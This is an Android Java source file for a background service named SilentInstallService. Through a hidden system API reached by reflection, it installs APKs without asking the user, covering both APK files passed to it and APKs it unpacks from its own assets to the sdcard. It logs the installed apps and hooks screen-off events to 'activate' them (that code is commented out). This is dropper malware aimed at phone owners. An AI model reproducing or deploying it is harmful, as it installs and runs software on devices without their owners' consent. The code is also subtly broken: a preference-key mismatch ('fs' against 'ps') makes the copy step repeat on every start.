package com.xstd.active.plugin;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.util.List;

import android.app.ActivityManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.IPackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.Environment;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

import com.xstd.active.plugin.dao.SilenceApp;
import com.xstd.active.plugin.dao.SilenceAppDaoUtils;

public class SilentInstallService extends Service {

    private IPackageManager manager;
    private ScreenChangeReceiver receiver;
    private SharedPreferences sharedPreferences;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        sharedPreferences = getSharedPreferences("setting", MODE_PRIVATE);

        try {
            @SuppressWarnings("rawtypes")
			Class clazz = getClassLoader().loadClass("android.os.ServiceManager");
            @SuppressWarnings("unchecked")
			Method method = clazz.getMethod("getService", new Class[]{String.class});
            IBinder b = (IBinder) method.invoke(null, "package");
            manager = IPackageManager.Stub.asInterface(b);
        } catch (Exception e) {
            e.printStackTrace();
        }

        receiver = new ScreenChangeReceiver();
        IntentFilter filter = new IntentFilter();
        filter.setPriority(Integer.MAX_VALUE);
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        registerReceiver(receiver, filter);

        boolean fs = sharedPreferences.getBoolean("fs", false);
        if (!fs)
            copyFileToCache();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (receiver != null)
            unregisterReceiver(receiver);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String apk_path = intent.getStringExtra("apk_path");
        if (apk_path != null)
            installFile(new File(apk_path));
        return super.onStartCommand(intent, flags, startId);
    }

    class ScreenChangeReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            String action = intent.getAction();
            if (Intent.ACTION_SCREEN_ON.equals(action)) {
                active = false;
            } else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                activeApp();
            } else if (Intent.ACTION_USER_PRESENT.equals(action)) {
                checkUpdates();
            }
        }
    }

    private void checkUpdates() {

    }

    /**
     * 停止激活程序
     */
    private void stopActiveApp() {
        if (packageName != null) {
            ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            am.killBackgroundProcesses(packageName);
        }
    }

    private boolean active;
    private String packageName;

    /**
     * 激活安装的程序
     */
    private void activeApp() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                active = true;
                List<SilenceApp> sps = SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext()).queryRaw("active=0");
                Log.w("ps", sps.size() + "");
                if (!active) {
                    stopActiveApp();
                    return;
                }
//                while (active && cursor.moveToNext()) {
//                    String packname = cursor.getString(1);
//                    packageName = packname;
//                    Log.w("ps", "开始激活：" + packageName);
//                    Intent app = getPackageManager().getLaunchIntentForPackage(packname);
//                    startActivity(app);
//                    if (!active) {
//                        stopActiveApp();
//                        return;
//                    }
//                    SystemClock.sleep(30000);
//                    ContentValues values = new ContentValues();
//                    values.put("active", 1);
//                    db.update("SilentApp", values, "packname=?", new String[]{packname});
//                }
//                if (cursor != null)
//                    cursor.close();
            }
        }).start();
    }

    private void installFile(File file) {
        if (file == null)
            return;
        if (!file.isFile())
            return;
        if (file.length() <= 0)
            return;
        if (!file.getName().endsWith(".apk"))
            return;
        String packName = getPackageName(file.getAbsolutePath());
        Uri uri = Uri.fromFile(file);
        if (uri != null)
            try {
                manager.installPackage(uri, new IPackageInstallObserver.Stub() {

                    @Override
                    public void packageInstalled(String packageName, int returnCode) throws RemoteException {
                        if (returnCode == 1) {
                            SilenceApp sa = new SilenceApp();
                            sa.setPackagename(packageName);
                            sa.setInstalltime(System.currentTimeMillis());
                            sa.setActive(false);
                            SilenceAppDaoUtils.getSilenceAppDao(getApplicationContext()).insert(sa);
                        }
                    }
                }, 0, packName);
            } catch (RemoteException e) {
                e.printStackTrace();
            }
    }

    /**
     * 通过APK包的绝对路径获得APK包的包名
     *
     * @param absPath APK的绝对路径
     * @return APK的包名
     */
    private String getPackageName(String absPath) {
        PackageInfo pkgInfo = getPackageManager().getPackageArchiveInfo(absPath, PackageManager.GET_ACTIVITIES);
        if (pkgInfo != null) {
            return pkgInfo.applicationInfo.packageName;
        }
        return null;
    }

    private void copyFileToCache() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                if (!Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED))
                    return;
                String sdcardPath = Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "Download";
                AssetManager assets = getAssets();
                InputStream is = null;
                OutputStream os = null;
                try {
                    for (String app : assets.list("")) {
                        if (!app.endsWith(".apk"))
                            continue;
                        File file = new File(sdcardPath, app);
                        if (file.exists())
                            continue;
                        is = assets.open(app);
                        os = new BufferedOutputStream(new FileOutputStream(file));
                        byte[] b = new byte[1024 * 5];
                        int len;
                        while ((len = is.read(b)) != -1) {
                            os.write(b, 0, len);
                        }
                        os.flush();
                        installFile(file);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                } finally {
                    try {
                        if (is != null)
                            is.close();
                        if (os != null)
                            os.close();
                    } catch (Exception e) {
                    }
                }
                sharedPreferences.edit().putBoolean("ps", true).commit();
            }
        }).start();
    }

}